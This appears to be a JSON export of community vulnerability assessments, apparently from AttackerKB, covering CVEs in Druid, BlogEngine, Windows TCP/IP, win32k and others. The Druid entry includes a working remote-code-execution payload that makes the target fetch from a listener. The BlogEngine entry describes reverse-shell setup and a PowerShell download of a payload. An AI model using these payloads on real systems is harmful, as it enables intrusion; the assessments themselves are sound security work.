            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "d955a4bf-0c5c-4fe1-b055-4ff9e8373f6a",
      "editorId": "38047d0b-ee12-4823-af3f-dbbd759fa225",
      "topicId": "67aa97ac-e920-4d0c-9b50-6b1c42e683d1",
      "created": "2021-01-30T09:59:04.250918Z",
      "revisionDate": "2021-02-11T01:58:00.278022Z",
      "document": "Proof of Concept\r\n\r\nhttps://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "37dd4a1b-fd8c-4a3e-adef-f2dc864e68ff",
      "editorId": "0adda2ac-1fe3-4a74-956b-709e4c92d643",
      "topicId": "7d2aa7fe-2311-4fbe-b5e4-130d2602f980",
      "created": "2021-02-01T03:38:19.200598Z",
      "revisionDate": "2021-02-09T16:40:55.505507Z",
      "document": "This is a grave oversight of the way the NTFS driver handles path access to special directory attributes. Any kind of file access that could be performed by Windows where it might need to read a path trying to access the :$i30:$Bitmap attribute on a directory from the user's context will cause the corruption of the accessed directory. If performed over the root directory, the entire drive will be affected.\r\n\r\nSimple stuff like crafting a .url file with the path will cause the system to become corrupted. Please, avoid extracting any untrusted .URL/.LNK files from any files you download from the internet.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "e2d46e5a-39fa-4a14-9a17-3445411b4ca6",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "06000fae-591b-46c7-8573-3d63bddd0d13",
      "created": "2021-02-04T19:15:17.416329Z",
      "revisionDate": "2021-02-09T16:40:50.625806Z",
      "document": "Seeing more evidence of people trying to exploit this in the wild in recent days, with samples such as the ones listed at https://twitter.com/dnpushme/status/1350022293464907780 being detected as CVE-2021-1647 exploit files per VirusTotal analysis.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "93d9fb72-74b8-423a-9eb0-10352e86d424",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "15082d97-cb46-4433-9ba3-6c37dc148340",
      "created": "2021-02-04T22:34:57.421999Z",
      "revisionDate": "2021-02-11T01:57:26.872249Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/BFh8B71dfn/sonicwall-sma-100-series-10-x-firmware-zero-day-vulnerability#rapid7-analysis).",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "9846c736-004e-4ae8-85bf-4456b3d730ab",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "b61d2687-96ce-4ce9-939f-9e35da7814c4",
      "created": "2021-02-05T16:25:21.565982Z",
      "revisionDate": "2021-02-11T01:57:25.019065Z",
      "document": "Reported as exploited in the wild at https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html. Several news articles such as https://www.theverge.com/2021/2/5/22267872/chrome-88-zero-day-vulnerability-government-backed-hackers-security-researchers have suggested that given the timing of this bug, and that it was reported one day before Google's report on the North Korea hackers targeting security researchers (see https://www.theverge.com/2021/1/26/22250060/google-threat-analysis-group-north-korean-hackers-cybersecurity-researchers-social-engineering), it may be related to the 0day Chrome bug that was used by North Korean state actors in that engagement.\r\n\r\nGiven this is a remote heap overflow in the browser there may be some concerns regarding reliability though and whilst I'm sure there will be public exploits for this bug, I do question how reliable they will be given the nature of trying to exploit heap exploits. I would imagine the exploit would take advantage of JavaScript to craft the heap appropriately. Therefore a temporary, but not recommended, precaution may be to disable JavaScript in Chrome until one can apply this update.\r\n\r\nPlease note that Chrome will automatically apply the update if you open and close your browser. However people do tend to keep Chrome open with many tabs and then suspend their PC at the end of the day, so its possible that these patches will likely see an uptick in application when the next Patch Tuesday or company wide patch cycle is enforced and people are forced to reboot their PCs to apply patches, and therefore restart Chrome.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "61e82ed5-184d-48fb-b86c-3c5a357ce688",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "78b79b61-e949-48e9-ba41-a45cf0e9ea6c",
      "created": "2021-02-05T17:49:20.602114Z",
      "revisionDate": "2021-02-11T01:57:24.163988Z",
      "document": "Please see the [Rapid7 analysis on the zero-day vulnerability](https://attackerkb.com/topics/BFh8B71dfn/sonicwall-sma-100-series-10-x-firmware-zero-day-vulnerability#rapid7-analysis). It is suspected that CVE-2021-20016 was used to compromise SonicWall's internal network.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "68ec80fe-9b9a-4625-b3ae-899685fc56da",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "4d8a45d9-93e7-4267-b52c-96ab82df5a06",
      "created": "2021-02-05T22:45:05.314314Z",
      "revisionDate": "2021-02-11T01:57:04.752415Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/GuXRxDl2UG/cve-2021-25274#rapid7-analysis).",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "31bc0a56-2f16-499a-ac16-b540873a16ee",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "0e681f53-d1e0-4f8c-8799-7801d5905a7d",
      "created": "2021-02-06T03:30:38.985222Z",
      "revisionDate": "2021-04-09T17:35:24.051707Z",
      "document": "From Wikipedia:\r\n\r\n> **Druid is a column-oriented, open-source, distributed data store written in Java.** Druid is designed to quickly ingest massive quantities of event data, and provide low-latency queries on top of the data.[1] The name Druid comes from the shapeshifting Druid class in many role-playing games, to reflect the fact that the architecture of the system can shift to solve different types of data problems.\r\n>\r\n> Druid is commonly used in business intelligence/OLAP applications to analyze high volumes of real-time and historical data.[2] **Druid is used in production by technology companies such as Alibaba,[2] Airbnb,[2] Cisco,[3][2] eBay,[4] Lyft,[5] Netflix,[6] PayPal,[2] Pinterest,[7] Twitter,[8] Walmart,[9] Wikimedia Foundation[10] and Yahoo.[11]**\r\n\r\nContrary to the CVE description, this appears to be both **unauthenticated** and **vulnerable in the default configuration** of Apache Druid 0.20.0, at least [from Docker](https://druid.apache.org/docs/latest/tutorials/docker.html)?\r\n\r\n```\r\nwvu@kharak:~/Downloads$ curl -vH \"Content-Type: application/json\" http://127.0.0.1:8888/druid/indexer/v1/sampler -d @payload.json\r\n*   Trying 127.0.0.1...\r\n* TCP_NODELAY set\r\n* Connected to 127.0.0.1 (127.0.0.1) port 8888 (#0)\r\n> POST /druid/indexer/v1/sampler HTTP/1.1\r\n> Host: 127.0.0.1:8888\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Type: application/json\r\n> Content-Length: 949\r\n>\r\n* upload completely sent off: 949 out of 949 bytes\r\n< HTTP/1.1 200 OK\r\n< Date: Sat, 06 Feb 2021 02:23:07 GMT\r\n< Date: Sat, 06 Feb 2021 02:23:07 GMT\r\n< Content-Type: application/json\r\n< Vary: Accept-Encoding, User-Agent\r\n< Content-Length: 999\r\n<\r\n* Connection #0 to host 127.0.0.1 left intact\r\n{\"numRowsRead\":1,\"numRowsIndexed\":1,\"data\":[{\"input\":{\"name\":\"Wikipedia Edits\",\"description\":\"Edits on Wikipedia from one day\",\"spec\":\"{\\\"type\\\":\\\"index_parallel\\\",\\\"ioConfig\\\":{\\\"type\\\":\\\"index_parallel\\\",\\\"firehose\\\":{\\\"type\\\":\\\"http\\\",\\\"uris\\\":[\\\"https://druid.apache.org/data/wikipedia.json.gz\\\"]}},\\\"tuningConfig\\\":{\\\"type\\\":\\\"index_parallel\\\"},\\\"dataSchema\\\":{\\\"dataSource\\\":\\\"new-data-source\\\",\\\"granularitySpec\\\":{\\\"type\\\":\\\"uniform\\\",\\\"segmentGranularity\\\":\\\"DAY\\\",\\\"queryGranularity\\\":\\\"HOUR\\\"}}}\"},\"parsed\":{\"__time\":1262304000000,\"name\":\"Wikipedia Edits\",\"description\":\"Edits on Wikipedia from one day\",\"spec\":\"{\\\"type\\\":\\\"index_parallel\\\",\\\"ioConfig\\\":{\\\"type\\\":\\\"index_parallel\\\",\\\"firehose\\\":{\\\"type\\\":\\\"http\\\",\\\"uris\\\":[\\\"https://druid.apache.org/data/wikipedia.json.gz\\\"]}},\\\"tuningConfig\\\":{\\\"type\\\":\\\"index_parallel\\\"},\\\"dataSchema\\\":{\\\"dataSource\\\":\\\"new-data-source\\\",\\\"granularitySpec\\\":{\\\"type\\\":\\\"uniform\\\",\\\"segmentGranularity\\\":\\\"DAY\\\",\\\"queryGranularity\\\":\\\"HOUR\\\"}}}\"}}]}* Closing connection 0\r\nwvu@kharak:~/Downloads$\r\n```\r\n\r\n```\r\nwvu@kharak:~$ ncat -lkv 8080\r\nNcat: Version 7.91 ( https://nmap.org/ncat )\r\nNcat: Listening on :::8080\r\nNcat: Listening on 0.0.0.0:8080\r\nNcat: Connection from 192.168.123.1.\r\nNcat: Connection from 192.168.123.1:56727.\r\nGET / HTTP/1.1\r\nHost: 192.168.123.1:8080\r\nUser-Agent: Wget\r\nConnection: close\r\n```\r\n\r\n`payload.json` is adapted from [this PoC](https://gist.github.com/pikpikcu/d208f19ea222efe21c4a6e6003d57069), then formatted with [jq](https://stedolan.github.io/jq/).\r\n\r\n```\r\nwvu@kharak:~/Downloads$ cat payload.json\r\n{\r\n  \"type\": \"index\",\r\n  \"spec\": {\r\n    \"type\": \"index\",\r\n    \"ioConfig\": {\r\n      \"type\": \"index\",\r\n      \"inputSource\": {\r\n        \"type\": \"http\",\r\n        \"uris\": [\r\n          \"https://druid.apache.org/data/example-manifests.tsv\"\r\n        ]\r\n      },\r\n      \"inputFormat\": {\r\n        \"type\": \"tsv\",\r\n        \"findColumnsFromHeader\": true\r\n      }\r\n    },\r\n    \"dataSchema\": {\r\n      \"dataSource\": \"sample\",\r\n      \"timestampSpec\": {\r\n        \"column\": \"timestamp\",\r\n        \"missingValue\": \"2010-01-01T00:00:00Z\"\r\n      },\r\n      \"dimensionsSpec\": {},\r\n      \"transformSpec\": {\r\n        \"transforms\": [],\r\n        \"filter\": {\r\n          \"type\": \"javascript\",\r\n          \"function\": \"function(value){return java.lang.Runtime.getRuntime().exec('wget http://192.168.123.1:8080/')}\",\r\n          \"dimension\": \"added\",\r\n          \"\": {\r\n            \"enabled\": \"true\"\r\n          }\r\n        }\r\n      }\r\n    },\r\n    \"tuningConfig\": {\r\n      \"type\": \"index\"\r\n    }\r\n  },\r\n  \"samplerConfig\": {\r\n    \"numRows\": 50,\r\n    \"timeoutMs\": 10000\r\n  }\r\n}\r\nwvu@kharak:~/Downloads$\r\n```\r\n\r\nSome references for creating your own PoC:\r\n\r\n* https://druid.apache.org/docs/latest/tutorials/tutorial-transform-spec.html\r\n* https://druid.apache.org/docs/latest/querying/filters.html",
      "score": 6,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d6785413-e429-410e-abdc-520741579445",
      "editorId": "c01088ae-afdb-4473-8ec7-2acbf8c5b7ae",
      "topicId": "977f5e8b-d00f-48d9-99b4-8b72a21c8d33",
      "created": "2021-02-06T16:28:21.787839Z",
      "revisionDate": "2021-02-11T01:56:57.034703Z",
      "document": "This attack was extremely easy to use. My jaw almost hit the ground at the ease. My only worry is that this will be a very hard attack to find in the wild as it depends on specific versions of the software to work.\r\n\r\nThings to keep in mind:\r\n-You will need to change your IP address and port inside the script. Near the beginning of the script, there is a line for System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"$LHOST\", $LPORT). Set the host and port accordingly. \r\n-I have had several instances where I would need to restart the BlogEngine server or the reverse shell would hang up in some terminal windows but not others, this exploit creates a very unstable shell.\r\n-The script should be named PostView.ascx\r\n\r\nMoving from here: \r\n-It is recommended to upgrade to a different shell as soon as possible. \r\n-I have had the most luck with Meterpreter. Creating a reverse shell with msfvenom and then uploading it to the BlogEngine server with PowerShell. -> powershell Invoke-WebRequest -Uri http://10.10.10.10:8888/reverse.exe -Outfile reverse.exe",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "5d97f2c9-cdec-494e-bb79-3fde2c508ceb",
      "editorId": "8f8c1e9a-6a4e-4d7e-9f16-a041f3311bf1",
      "topicId": "01d63072-ba00-4550-bd35-941f73657fdb",
      "created": "2021-02-08T20:53:33.857357Z",
      "revisionDate": "2021-12-25T15:44:21.12664Z",
      "document": "# Fanny.bmp\r\n- https://github.com/loneicewolf/fanny.bmp/blob/main/Reports/Fanny.BMP(DementiaWheel)_Technical_Report_By_WilliamMartens-2021-10Feb.pdf \r\n Technical Write up: DONE. Finally,  it's available here for read \r\n(and, please feedback! if you have any)\r\n https://www.youtube.com/watch?v=Uto_lcD2f38  POC video for windows xp SP3 \r\n\r\n- Sample:(GitHub)  https://github.com/loneicewolf/fanny.bmp \r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "3fc736b4-3359-4e2d-8c6f-32537e21be31",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "4bb453dc-4a7e-4faf-832b-c5079208a3da",
      "created": "2021-02-09T21:16:30.676851Z",
      "revisionDate": "2021-02-11T01:56:49.257562Z",
      "document": "This remains a spectacularly new vulnerability with little documentation associated with it beyond Microsoft's blog here: https://msrc-blog.microsoft.com/2021/02/09/multiple-security-updates-affecting-tcp-ip/\r\nIn the blog, they report that this vulnerability is associated with IPv4 source routing, but the default blocks against source routing on Windows are not suffcient, as the default configuration allows a Windows system to process ICMP requests with source routing.  \r\nReported as a remote code execution vulnerability, Microsoft claims that it will likely not be weaponized for that purpose quickly, though it might see a DoS exploit in the near-term.\r\nThere is a patch, but also, the mitigations provided in the guidance (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24074) involve the creation of a rule blocking source forwarding from the built-in firewall:\r\n```netsh int ipv4 set global sourceroutingbehavior=drop```\r\nSuch a change in the firewall configuration can be deployed by group policy and would not require a reboot.  The rule could also be deployed to infrastructure firewalls, but would then only protect against attacks that took place across the firewall; the rules would need to be set on all Windows system host-based firewalls to protect against lateral movement within a network.",
      "score": 6,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "9def72e9-9f34-4cfe-84b5-4bbb77bfd706",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "5acc27ec-b7f2-405f-b3d6-009d27a1c386",
      "created": "2021-02-09T21:42:41.925232Z",
      "revisionDate": "2021-02-11T01:56:47.688239Z",
      "document": "This remains a spectacularly new vulnerability with little documentation associated with it beyond Microsoft\u2019s blog here: https://msrc-blog.microsoft.com/2021/02/09/multiple-security-updates-affecting-tcp-ip/\r\nIn the blog, this is a remote code execution vulnerability reported as associated with IPv6 packet reassembly.  According to the vulnerability report here: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24094, there is a patch, and  you can create a firewall rule on Windows host-based firewalls to block an attack with the command `Netsh int ipv6 set global reassemblylimit=0` to block packet reassembly.  THIS MAY AFFECT SOME NETWORK TRAFFIC.\r\nA second denial of service vulnerability (CVE-2021-24086) also associated with IPv6 fragment reassembly is mitigated with the same command.\r\nAs pure speculation, this vulnerability might be associated with memory corruption through improper length reporting, such that when packets are reassembled in memory, they are placed in a buffer of insufficient size to store them.  Should that be the case, this would most likely be a heap vulnerability, and like other heap vulnerabilities before it like eternalblue, bluekeep, and dejablue, it will be a real pain to get to work on a regular basis or as a worm-able exploit.",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "1a332300-7ded-419b-b717-9bf03ca2a14e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "dfa2540d-e431-4cde-b67a-7ea3f2b87a74",
      "created": "2021-02-10T22:03:10.634011Z",
      "revisionDate": "2021-02-17T18:09:24.600252Z",
      "document": "A very interesting vulnerability in win32kfull.sys on Windows 10 devices up to and including 20H2. Although the exploit in the wild specifically targeted Windows 10 v1709 to Windows 10 v1909, as noted at https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/, the researchers noted that the vulnerability could be modified to work on Windows 20H2 with minor modifications.\r\n\r\nFrom my perspective this is rather significant, particularly given this is a win32kfull.sys bug we are talking about here. Most of the primitives that made win32k exploitation easier were entirely wiped out by Microsoft which prompted a lot of researchers who previously spoke publicly about such primitives in conference talks and similar to go quiet. Whilst rumor has been that there were other primitives one could use for exploitation, they were considered closely guarded secrets due to the difficulty in finding them and the fact that Microsoft would be likely to patch them very quickly.\r\n\r\nThe new primitive that is used here appears to be setting tagMenuBarInfo.rcBar.left and tagMenuBarInfo.rcBar.top and then calling GetMenuBarInfo(), which allows one to perform an arbitrary read in kernel memory. This has not been discussed before but is similar to another concepted discussed in the paper \"LPE vulnerabilities exploitation on Windows 10 Anniversary Update\" at ZeroNights which mentioned using two adjacent Windows and then setting the cbwndExtra field of the first window to a large value to allow the first window to set all of the properties of the second window. By chaining this together the attacker could achieve an arbitrary read and write in kernel memory.\r\n\r\nThe bug itself stems from a xxxClientAllocWindowClassExtraBytes() callback within win32kfull!xxxCreateWindowEx. Specifically when xxxCreateWindowEx() creates a window object with a cbwndExtra field set, aka it has extra Window bytes, it will perform a xxxClientAllocWindowClassExtraBytes() callback to usermode to allocate the extra bytes for the Window.\r\n\r\nYou may be wondering why such callbacks are needed. Well a long time ago Windows used to handle all its graphics stuff in kernel mode, but then people realized that was too slow given increasing demands for speed, so they made most of the code operate in usermode with key stuff handled by kernel mode. This lead to a big rift and is the reason we have callbacks. Thats the nutshell version anyway but go read up on http://mista.nu/research/mandt-win32k-slides.pdf and https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf if you want to learn more. Its a fascinating read :)\r\n\r\nAnyway back on topic. Since xxxClientAllocWindowClassExtraBytes() is a callback that is under the attackers controller, the attacker can set a hook that will trigger when a xxxClientAllocWindowClassExtraBytes() callback is made and call NtUserConsoleControl() with the handle of the window that is currently being operated on. This will end up calling xxxConsoleControl() in kernel mode which will set *((tagWND+0x28)+0x128) to an offset, and will AND the flag at *((tagWND+0x28) + 0xE8) with 0x800 to indicate that the value of the WndExtra member is an offset from the base address of RtlHeapBase. Unfortunately, whatever value is returned by the hooked xxxClientAllocWindowClassExtraBytes() callback (aka whatever value the attacker chooses) will be used as the value of WndExtra, since remember we are meant to be allocating the address of this field at the time due to the earlier xxxCreateWindowEx() call needing to allocate memory for WndExtra.\r\n\r\nOnce this is done, the callback will be completed, execution will return to usermode, and a call to DestroyWindow() will be made from usermode. This will cause xxxDestroyWindow() to be called in kernel mode which will call xxxFreeWindow(), which will check if *((tagWND+0x28) + 0xE8) has the flag designated by 0x800 set, which it will due to the alterations made by xxxConsoleControl(). This will then result in a call to RtlFreeHeap() which will attempt to free an address designated by RtlHeapBase + offset, where offset is the value of WndExtra (which is taken from the xxxClientAllocWindowClassExtraBytes() callback and therefore completely controlled by the attacker).\r\n\r\nThis subsequently results in the attacker being able to free memory at an arbitrary address in memory.\r\n\r\nI'll not dive into a full detailed analysis of the rest of the exploitation steps as the article at https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/ is very comprehensive but I will say from what I've read there, there is enough detail that people of a decent skill level could probably recreate this exploit. It certainly isn't an easy exploit to recreate but the exploit goes into a lot of detail about the various mitigation bypasses that were used to make this exploit possible, which could help an attacker more readily recreate this bug.\r\n\r\nAgain, this exploit was exploited in the wild so it is possible for this bug to be recreated, it just might take some time for people to work out a few of the specifics needed to get a working exploit. If you are running Windows 10, it is highly advised to upgrade as soon as possible: everything I am reading here points to signs that this will be weaponized within the coming few weeks or months.\r\n\r\nAdditionally it should be noted that this exploit was noted to be capable of escaping Microsoft IE's sandbox (but not Google Chrome's) so if you are running Microsoft IE within your environment, its even more imperative that you patch this issue to prevent an attacker from combining this with an IE 0day and conducting a drive by attack against your organization, whereby simply browsing a website could lead to attackers gaining SYSTEM level privileges against affected systems. ",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c94ea60a-43a9-419b-a394-0558a29adc52",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "5bb14b76-cc1d-43f1-9139-24405cf9e27f",
      "created": "2021-02-11T23:19:27.311093Z",
      "revisionDate": "2021-02-17T18:09:20.004242Z",
      "document": "The patch adds authentication to `updateSystemSettings()`, `exportInventoryTable()`, and a number of other methods.\r\n\r\n```diff\r\n   private boolean updateSystemSettings(HttpServletRequest request, HttpServletResponse response) {\r\n     boolean bReturn = false;\r\n     boolean bDataOk = false;\r\n     StringBuffer strResults = new StringBuffer();\r\n     String strPROMFilePath = new String();\r\n     String strExportFilePath = new String();\r\n     String strImportFilePath = new String();\r\n     String strConfigFilePath = new String();\r\n     String strDbBackupFilePath = new String();\r\n     String strZTPTemplatesPath = new String();\r\n     String strSSHPort = new String();\r\n     String strTFTPPort = new String();\r\n     String strMaxBackupFiles = new String();\r\n     String strNetworkScanTimeout = new String();\r\n     String strUserSessionTimeout = new String();\r\n     String strJSONObj = request.getParameter(\"json_obj\");\r\n     String strJSONNamingObj = request.getParameter(\"json_naming_obj\");\r\n     SystemTable tempSystemTable = new SystemTable();\r\n     int nUseCustomNaming = 0;\r\n     JSONObject objJSON = null;\r\n     DeviceTreeTable tempDeviceTreeTable = new DeviceTreeTable();\r\n+    HttpSession session = request.getSession();\r\n+    if (session == null || session.getAttribute(\"user_id\") == null || session.getAttribute(\"user_name\") == null || session.getAttribute(\"user_level\") == null) {\r\n+      strResults.append(\"Failed to update system settings: User Not Login\");\r\n+      System.out.println(\"Failed to update system settings: User Not Login\");\r\n+      response.setContentType(\"text/html\");\r\n+      try {\r\n+        PrintWriter out = response.getWriter();\r\n+        out.println(strResults);\r\n+      } catch (Exception e) {\r\n+        System.out.println(\"NetworkServlet-updateSystemSettings: \" + e.toString());\r\n+      }\r\n+      return bReturn;\r\n+    }\r\n+    boolean bSecVuln = false;\r\n     try {\r\n       objJSON = new JSONObject(new JSONTokener(strJSONObj));\r\n       strPROMFilePath = objJSON.getString(\"PROMPATH\");\r\n       strExportFilePath = objJSON.getString(\"EXPORTPATH\");\r\n       strImportFilePath = objJSON.getString(\"IMPORTPATH\");\r\n       strConfigFilePath = 